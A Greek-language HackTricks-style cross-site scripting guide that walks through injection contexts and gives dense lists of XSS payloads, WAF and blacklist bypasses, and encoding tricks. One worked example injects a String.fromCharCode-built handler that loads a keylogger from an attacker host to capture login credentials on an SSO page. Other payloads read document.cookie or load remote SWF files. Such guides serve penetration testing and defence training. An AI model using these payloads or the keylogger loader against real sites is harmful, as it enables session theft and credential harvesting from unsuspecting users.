# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Έλεγξε αν **οποιαδήποτε τιμή που ελέγχεις** (_parameters_, _path_, _headers_?, _cookies_?) **ανακλάται** στο HTML ή **χρησιμοποιείται** από κώδικα **JS**.
2. **Βρες το context** όπου ανακλάται/χρησιμοποιείται.
3. Αν είναι **reflected**
1. Έλεγξε **ποια σύμβολα μπορείς να χρησιμοποιήσεις** και ανάλογα ετοίμασε το payload:
1. Σε **raw HTML**:
1. Μπορείς να δημιουργήσεις νέα HTML tags;
2. Μπορείς να χρησιμοποιήσεις events ή attributes που υποστηρίζουν το `javascript:` protocol;
3. Μπορείς να παρακάμψεις protections;
4. Αν το HTML περιεχόμενο ερμηνεύεται από κάποιο client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), μπορείς να εκμεταλλευτείς ένα [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Αν δεν μπορείς να δημιουργήσεις HTML tags που εκτελούν JS, μπορείς να εκμεταλλευτείς ένα [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html);
2. Μέσα σε ένα **HTML tag**:
1. Μπορείς να βγεις στο raw HTML context;
2. Μπορείς να δημιουργήσεις νέα events/attributes που εκτελούν JS;
3. Το attribute όπου είσαι "παγιδευμένος" υποστηρίζει εκτέλεση JS;
4. Μπορείς να παρακάμψεις protections;
3. Μέσα σε **JavaScript code**:
1. Μπορείς να ξεφύγεις από το `<script>` tag;
2. Μπορείς να ξεφύγεις από το string και να εκτελέσεις διαφορετικό JS κώδικα;
3. Τα inputs σου βρίσκονται σε template literals ````;
4. Μπορείς να παρακάμψεις protections;
4. Javascript **function** που εκτελείται
1. Μπορείς να δηλώσεις το όνομα της function που θα εκτελεστεί. π.χ.: `?callback=alert(1)`
4. Αν **χρησιμοποιείται**:
1. Μπορείς να εκμεταλλευτείς ένα **DOM XSS**, πρόσεξε πώς ελέγχεται το input σου και αν το **ελεγχόμενο input χρησιμοποιείται από κάποιο sink.**

Όταν δουλεύεις πάνω σε ένα σύνθετο XSS ίσως σε ενδιαφέρει να διαβάσεις:

{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Τιμές που ανακλώνται

Για να εκμεταλλευτείς επιτυχώς ένα XSS το πρώτο που πρέπει να βρεις είναι μία **τιμή που ελέγχεις και ανακλάται** στη σελίδα.

- **Intermediately reflected**: Αν βρεις ότι η τιμή ενός parameter ή ακόμη και του path ανακλάται στη σελίδα, μπορείς να εκμεταλλευτείς ένα **Reflected XSS**.
- **Stored and reflected**: Αν βρεις ότι μια τιμή που ελέγχεις αποθηκεύεται στον server και ανακλάται κάθε φορά που επισκέπτεσαι μια σελίδα μπορείς να εκμεταλλευτείς ένα **Stored XSS**.
- **Accessed via JS**: Αν βρεις ότι μια τιμή που ελέγχεις προσπελαύνεται μέσω JS μπορείς να εκμεταλλευτείς ένα **DOM XSS**.

## Συμφραζόμενα

Όταν προσπαθείς να εκμεταλλευτείς ένα XSS το πρώτο που πρέπει να ξέρεις είναι **που ανακλάται το input σου**. Ανάλογα με το context, θα μπορέσεις να εκτελέσεις αυθαίρετο JS κώδικα με διαφορετικούς τρόπους.

### Raw HTML

Αν το input σου **ανακλάται στο raw HTML** της σελίδας θα χρειαστεί να εκμεταλλευτείς κάποιο **HTML tag** για να εκτελέσεις JS: `<img , <iframe , <svg , <script` ... αυτά είναι μερικά από τα πολλά HTML tags που μπορείς να χρησιμοποιήσεις.\
Επίσης, να έχεις υπόψη το [Client Side Template Injection](../client-side-template-injection-csti.md).

### Inside HTML tags attribute

Αν το input σου ανακλάται μέσα στην τιμή ενός attribute ενός tag μπορείς να δοκιμάσεις:

1. Να **δραπετεύσεις από το attribute και από το tag** (τότε θα βρεθείς στο raw HTML) και να δημιουργήσεις νέο HTML tag για εκμετάλλευση: `"><img [...]`
2. Αν **μπορείς να δραπετεύσεις από το attribute αλλά όχι από το tag** (`>` κωδικοποιείται ή διαγράφεται), ανάλογα με το tag μπορείς να **δημιουργήσεις ένα event** που εκτελεί JS: `" autofocus onfocus=alert(1) x="`
3. Αν **δεν μπορείς να δραπετεύσεις από το attribute** (`"` κωδικοποιείται ή διαγράφεται), τότε ανάλογα με **ποιο attribute** ανακλάται η τιμή σου και **αν ελέγχεις όλη την τιμή ή μόνο ένα μέρος**, θα μπορέσεις να το εκμεταλλευτείς. Για **παράδειγμα**, αν ελέγχεις ένα event όπως `onclick=` θα μπορείς να εκτελέσεις αυθαίρετο κώδικα όταν γίνει click. Ένα άλλο ενδιαφέρον **παράδειγμα** είναι το attribute `href`, όπου μπορείς να χρησιμοποιήσεις το `javascript:` protocol για να εκτελέσεις αυθαίρετο κώδικα: **`href="javascript:alert(1)"`**
4. Αν το input σου ανακλάται μέσα σε "unexpoitable tags" μπορείς να δοκιμάσεις το κόλπο με το **`accesskey`** για να εκμεταλλεύσεις τη vuln (θα χρειαστείς κάποιου είδους social engineering για να την εκμεταλλεύσεις): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

Μια εταιρική σελίδα login SSO πρόβαλε το OAuth `service` parameter μέσα στο `href` attribute του `<a id="forgot_btn" ...>`. Παρόλο που τα `<` και `>` κωδικοποιούνταν ως HTML entities, τα διπλά εισαγωγικά δεν κωδικοποιούνταν, οπότε ο επιτιθέμενος μπορούσε να κλείσει το attribute και να ξαναχρησιμοποιήσει το ίδιο στοιχείο για να εγχύσει handlers όπως `" onfocus="payload" x="`.

1. **Εισαγωγή του handler:** Απλά payloads όπως `onclick="print(1)"` μπλοκαρίστηκαν, αλλά το WAF έλεγχε μόνο την πρώτη JavaScript δήλωση σε inline attributes. Προσθέτοντας μια αθώα έκφραση τυλιγμένη σε παρένθεση και μετά ένα ερωτηματικό, επέτρεψε στο πραγματικό payload να εκτελεστεί: `onfocus="(history.length);malicious_code_here"`.
2. **Αυτο-εκκίνηση:** Οι browsers κάνουν focus σε οποιοδήποτε στοιχείο του οποίου το `id` ταιριάζει με το fragment, οπότε προσθέτοντας `#forgot_btn` στο exploit URL αναγκάζεις το anchor να πάρει focus κατά το φόρτωμα της σελίδας και να τρέξει τον handler χωρίς να χρειάζεται click.
3. **Διατήρηση μικρού inline stub:** Ο στόχος είχε ήδη φορτώσει jQuery. Ο handler χρειαζόταν απλώς να κάνει bootstrap ένα request μέσω `$.getScript(...)` ενώ ο πλήρης keylogger φιλοξενούνταν στον server του επιτιθέμενου.

Δημιουργία strings χωρίς εισαγωγικά

Τα single quotes επέστρεφαν URL-encoded και τα escaped double quotes κατέστρεφαν το attribute, οπότε το payload δημιούργησε κάθε string με `String.fromCharCode`. Μια βοηθητική συνάρτηση διευκολύνει τη μετατροπή οποιουδήποτε URL σε char codes πριν το επικολλήσεις στο attribute:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Το προκύπτον χαρακτηριστικό είχε την εξής μορφή:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Γιατί αυτό κλέβει credentials**

Το εξωτερικό script (loaded from an attacker-controlled host or Burp Collaborator) έκανε hook το `document.onkeypress`, buffered keystrokes, και κάθε δευτερόλεπτο έστελνε `new Image().src = collaborator_url + keys`. Επειδή το XSS μόνο ενεργοποιείται για unauthenticated users, η ευαίσθητη ενέργεια είναι η login form καθαυτή — ο attacker keylogs usernames και passwords ακόμα κι αν το θύμα δεν πατήσει ποτέ "Login".

Παράξενο παράδειγμα όπου το Angular εκτελεί XSS αν ελέγχεις ένα class name:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Μέσα σε JavaScript κώδικα

Σε αυτή την περίπτωση το input σας ανακλάται ανάμεσα σε **`<script> [...] </script>`** tags μιας HTML σελίδας, μέσα σε ένα αρχείο `.js` ή μέσα σε ένα attribute που χρησιμοποιεί το πρωτόκολλο **`javascript:`**:

- Αν ανακλάται ανάμεσα σε **`<script> [...] </script>`** tags, ακόμη και αν το input σας είναι μέσα σε οποιονδήποτε τύπο quotes, μπορείτε να προσπαθήσετε να εισάγετε `</script>` και να ξεφύγετε από αυτό το context. Αυτό λειτουργεί επειδή ο **browser θα πρώτα αναλύσει τα HTML tags** και μετά το περιεχόμενο, επομένως δεν θα παρατηρήσει ότι το εγχυμένο `</script>` tag βρίσκεται μέσα στον HTML κώδικα.
- Αν ανακλάται **μέσα σε ένα JS string** και το προηγούμενο τρικ δεν δουλεύει, θα χρειαστείτε να **βγείτε** από το string, να **εκτελέσετε** τον κώδικά σας και να **ανακατασκευάσετε** τον JS κώδικα (αν υπάρχει κάποιο σφάλμα, δεν θα εκτελεστεί:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Αν ανακλάται μέσα σε template literals μπορείτε να **ενσωματώσετε JS εκφράσεις** χρησιμοποιώντας τη σύνταξη `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** λειτουργεί για να γράψετε **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting references the opportunity to **declare functions, variables or classes after they are used so you can abuse scenarios where a XSS is using undeclared variables or functions.**\
**Δες την παρακάτω σελίδα για περισσότερες πληροφορίες:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Several web pages have endpoints that **accept as parameter the name of the function to execute**. A common example to see in the wild is something like: `?callback=callbackFunc`.

Ένας καλός τρόπος για να διαπιστώσεις αν κάτι που δίνεται απευθείας από τον χρήστη προσπαθεί να εκτελεστεί είναι **να τροποποιήσεις την τιμή της παραμέτρου** (για παράδειγμα σε 'Vulnerable') και να κοιτάξεις στην console για σφάλματα όπως:

![](<../../images/image (711).png>)

Σε περίπτωση που είναι vulnerable, μπορείς να καταφέρεις να trigger an alert απλώς στέλνοντας την τιμή: **`?callback=alert(1)`**. Ωστόσο, είναι πολύ συνηθισμένο ότι αυτά τα endpoints θα validate το περιεχόμενο ώστε να επιτρέπουν μόνο γράμματα, αριθμούς, τελείες και underscores (**`[\w\._]`**).

Ωστόσο, ακόμη και με αυτόν τον περιορισμό εξακολουθεί να είναι δυνατό να εκτελέσεις ορισμένες ενέργειες. Αυτό συμβαίνει επειδή μπορείς να χρησιμοποιήσεις αυτούς τους έγκυρους χαρακτήρες για να **προσπελάσεις οποιοδήποτε στοιχείο στο DOM**:

![](<../../images/image (747).png>)

Μερικές χρήσιμες functions για αυτό:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Μπορείτε επίσης να δοκιμάσετε να **trigger Javascript functions** απευθείας: `obj.sales.delOrders`.

Ωστόσο, συνήθως τα endpoints που εκτελούν την ενδεικνυόμενη function είναι endpoints χωρίς πολύ ενδιαφέρον DOM, **other pages in the same origin** θα έχουν ένα **περισσότερο ενδιαφέρον DOM** για να εκτελέσετε περισσότερες ενέργειες.

Για αυτό, προκειμένου να **abuse this vulnerability in a different DOM** αναπτύχθηκε η εκμετάλλευση **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Υπάρχει **JS code** που χρησιμοποιεί **με ανασφαλή τρόπο** κάποια **δεδομένα που ελέγχονται από έναν attacker** όπως `location.href`. Ένας attacker θα μπορούσε να το κακοποιήσει για να εκτελέσει αυθαίρετο JS code.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Αυτό το είδος XSS μπορεί να βρεθεί **οπουδήποτε**. Δεν εξαρτάται μόνο από την εκμετάλλευση του client μιας web εφαρμογής αλλά από **οποιοδήποτε** **context**. Αυτό το είδος της **arbitrary JavaScript execution** μπορεί ακόμη να κακοποιηθεί για να αποκτήσει **RCE**, να **διαβάσει** **arbitrary** **files** σε clients και servers, και περισσότερα.\
Κάποια **παραδείγματα**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Εισαγωγή μέσα σε raw HTML

Όταν η είσοδός σας αντανακλάται **μέσα στη HTML page** ή μπορείτε να διαφύγετε και να εισάγετε HTML code σε αυτό το context, το **πρώτο** πράγμα που πρέπει να κάνετε είναι να ελέγξετε αν μπορείτε να κακοποιήσετε τον χαρακτήρα `<` για να δημιουργήσετε νέα tags: Απλώς δοκιμάστε να **reflect** αυτόν τον **char** και ελέγξτε αν κωδικοποιείται ως **HTML encoded** ή **διαγράφεται** ή αν **αντικατοπτρίζεται χωρίς αλλαγές**. **Μόνο στην τελευταία περίπτωση θα μπορέσετε να το εκμεταλλευτείτε**.\
Για αυτές τις περιπτώσεις επίσης **keep in mind** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Σημείωση: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_ 

Σε αυτή την περίπτωση και αν δεν χρησιμοποιείται black/whitelisting, μπορείτε να χρησιμοποιήσετε payloads όπως:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Αλλά, αν χρησιμοποιείται tags/attributes black/whitelisting, θα χρειαστεί να **brute-force which tags** μπορείτε να δημιουργήσετε.\
Μόλις έχετε **located which tags are allowed**, θα χρειαστεί να **brute-force attributes/events** μέσα στα έγκυρα tags που βρήκατε για να δείτε πώς μπορείτε να επιτεθείτε στο πλαίσιο.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force all the events** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### Custom tags

If you didn't find any valid HTML tag, you could try to **create a custom tag** and and execute JS code with the `onfocus` attribute. In the XSS request, you need to end the URL with `#` to make the page **focus on that object** and **execute** the code:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Εάν χρησιμοποιείται κάποια blacklist, μπορείς να προσπαθήσεις να την bypass με μερικά αφελή κόλπα:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Παράκαμψη μήκους (μικρές XSSs)

> [!NOTE] > **Περισσότερα tiny XSS για διαφορετικά περιβάλλοντα** payload [**μπορούν να βρεθούν εδώ**](https://github.com/terjanq/Tiny-XSS-Payloads) και [**εδώ**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Το τελευταίο χρησιμοποιεί 2 unicode χαρακτήρες που επεκτείνονται σε 5: telsr\
Περισσότεροι από αυτούς τους χαρακτήρες μπορούν να βρεθούν [here](https://www.unicode.org/charts/normalization/).\
Για να ελέγξετε σε ποιους χαρακτήρες αποσυντίθεται δείτε [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

If in order to exploit the vulnerability you need the **user to click a link or a form** with prepopulated data you could try to [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (if the page is vulnerable).

### Αδύνατο - Dangling Markup

Αν απλώς νομίζετε ότι **είναι αδύνατο να δημιουργήσετε ένα HTML tag με ένα attribute για να εκτελέσει JS code**, θα πρέπει να ελέγξετε [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)επειδή μπορείτε να **exploit** την ευπάθεια **χωρίς** να εκτελέσετε **JS** code.

## Εισαγωγή μέσα σε HTML tag

### Μέσα στο tag/escaping από attribute value

Αν βρίσκεστε **μέσα σε ένα HTML tag**, το πρώτο πράγμα που μπορείτε να δοκιμάσετε είναι να **διαφύγετε** από το tag και να χρησιμοποιήσετε μερικές από τις τεχνικές που αναφέρονται στην [previous section](#injecting-inside-raw-html) για να εκτελέσετε JS code.\
Αν **δεν μπορείτε να διαφύγετε από το tag**, μπορείτε να δημιουργήσετε νέα attributes μέσα στο tag για να προσπαθήσετε να εκτελέσετε JS code, για παράδειγμα χρησιμοποιώντας κάποιο payload όπως (_σημείωση ότι σε αυτό το παράδειγμα τα double quotes χρησιμοποιούνται για να διαφύγετε από το attribute, δεν θα τα χρειαστείτε αν η είσοδός σας αντανακλάται απευθείας μέσα στο tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Συμβάντα στυλ**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Μέσα στο χαρακτηριστικό

Ακόμη κι αν **δεν μπορείτε να ξεφύγετε από το χαρακτηριστικό** (`"` κωδικοποιείται ή διαγράφεται), ανάλογα με **ποιο χαρακτηριστικό** εμφανίζεται η τιμή σας και **αν ελέγχετε ολόκληρη την τιμή ή μόνο ένα μέρος** θα είστε σε θέση να το εκμεταλλευτείτε. Για **παράδειγμα**, αν ελέγχετε ένα event όπως `onclick=` θα μπορείτε να το κάνετε να εκτελεί αυθαίρετο κώδικα όταν γίνει κλικ.\
Ένα άλλο ενδιαφέρον **παράδειγμα** είναι το χαρακτηριστικό `href`, όπου μπορείτε να χρησιμοποιήσετε το πρωτόκολλο `javascript:` για να εκτελέσετε αυθαίρετο κώδικα: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

Οι **HTML encoded χαρακτήρες** μέσα στην τιμή των attributes των HTML tags **αποκωδικοποιούνται κατά το runtime**. Επομένως κάτι σαν το ακόλουθο θα είναι έγκυρο (το payload είναι με έντονα): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Σημειώστε ότι **οποιοσδήποτε τύπος HTML encode είναι έγκυρος**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Σημειώστε ότι το URL encode θα λειτουργήσει επίσης:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass μέσα στο event χρησιμοποιώντας Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Ειδικά πρωτόκολλα εντός του χαρακτηριστικού

Εκεί μπορείτε να χρησιμοποιήσετε τα πρωτόκολλα **`javascript:`** ή **`data:`** σε ορισμένα σημεία για να **εκτελέσετε αυθαίρετο JS κώδικα**. Κάποια θα απαιτούν αλληλεπίδραση χρήστη ενώ κάποια άλλα όχι.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Μέρη όπου μπορείτε να ενέσετε αυτά τα πρωτόκολλα**

**Γενικά** το πρωτόκολλο `javascript:` μπορεί να **χρησιμοποιηθεί σε οποιοδήποτε tag που δέχεται το attribute `href`** και στα **περισσότερα** από τα tags που δέχονται το **attribute `src`** (αλλά όχι `<img`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Άλλα obfuscation tricks**

_**Σε αυτή την περίπτωση το HTML encoding και το Unicode encoding trick από την προηγούμενη ενότητα ισχύουν επίσης, καθώς βρίσκεστε μέσα σε ένα attribute.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Επιπλέον, υπάρχει ένα ακόμα **ωραίο κόλπο** για αυτές τις περιπτώσεις: **Ακόμα κι αν η είσοδός σας μέσα στο `javascript:...` κωδικοποιείται σε URL, θα αποκωδικοποιηθεί πριν εκτελεστεί.** Έτσι, αν χρειαστεί να **διαφύγετε** από τη **συμβολοσειρά** χρησιμοποιώντας ένα **απλό απόστροφο** και δείτε ότι **κωδικοποιείται σε URL**, να θυμάστε ότι **δεν έχει σημασία,** θα **ερμηνευτεί** ως **απλό απόστροφο** κατά την **εκτέλεση**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Σημειώστε ότι αν προσπαθήσετε να **χρησιμοποιήσετε και τα δύο** `URLencode + HTMLencode` με οποιαδήποτε σειρά για να κωδικοποιήσετε το **payload** δεν **θα** **λειτουργήσει**, αλλά μπορείτε να **τα αναμίξετε μέσα στο payload**.

**Χρήση Hex και Octal encode με `javascript:`**

Μπορείτε να χρησιμοποιήσετε **Hex** και **Octal encode** μέσα στο attribute `src` του `iframe` (τουλάχιστον) για να δηλώσετε **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Εάν μπορείτε να εγχύσετε οποιοδήποτε URL σε μια αυθαίρετη **`<a href=`** ετικέτα που περιέχει τα χαρακτηριστικά **`target="_blank" and rel="opener"`**, ελέγξτε την **παρακάτω σελίδα για να εκμεταλλευτείτε αυτή τη συμπεριφορά**:


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Πρώτα απ' όλα ελέγξτε αυτή τη σελίδα ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) για χρήσιμους **"on" event handlers**.\
Σε περίπτωση που υπάρχει κάποια blacklist που σας εμποδίζει να δημιουργήσετε αυτούς τους event handlers, μπορείτε να δοκιμάσετε τις ακόλουθες παρακάμψεις:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS σε "Μη εκμεταλλεύσιμες ετικέτες" (hidden input, link, canonical, meta)

Από [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **τώρα είναι δυνατό να γίνει κατάχρηση των hidden inputs με:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Και στα **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Από [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Μπορείτε να εκτελέσετε ένα **XSS payload inside a hidden attribute**, εφόσον μπορείτε να **πείσετε** τον **victim** να πατήσει τον **συνδυασμό πλήκτρων**. Στον Firefox σε Windows/Linux ο συνδυασμός πλήκτρων είναι **ALT+SHIFT+X** και στο OS X είναι **CTRL+ALT+X**. Μπορείτε να καθορίσετε διαφορετικό συνδυασμό πλήκτρων χρησιμοποιώντας διαφορετικό πλήκτρο στο access key attribute. Εδώ είναι το vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Το XSS payload θα είναι κάτι σαν το εξής: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Μερικά κόλπα που χρησιμοποιούν διαφορετικές κωδικοποιήσεις έχουν ήδη παρουσιαστεί μέσα σε αυτή την ενότητα. Επιστρέψτε για να μάθετε πού μπορείτε να χρησιμοποιήσετε:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Αν βρείτε ένα **XSS σε ένα πολύ μικρό μέρος** της σελίδας που απαιτεί κάποιο είδος αλληλεπίδρασης (ίσως ένας μικρός σύνδεσμος στο footer με ένα onmouseover element), μπορείτε να προσπαθήσετε να **τροποποιήσετε τον χώρο που καταλαμβάνει το στοιχείο** για να μεγιστοποιήσετε τις πιθανότητες να ενεργοποιηθεί ο σύνδεσμος.

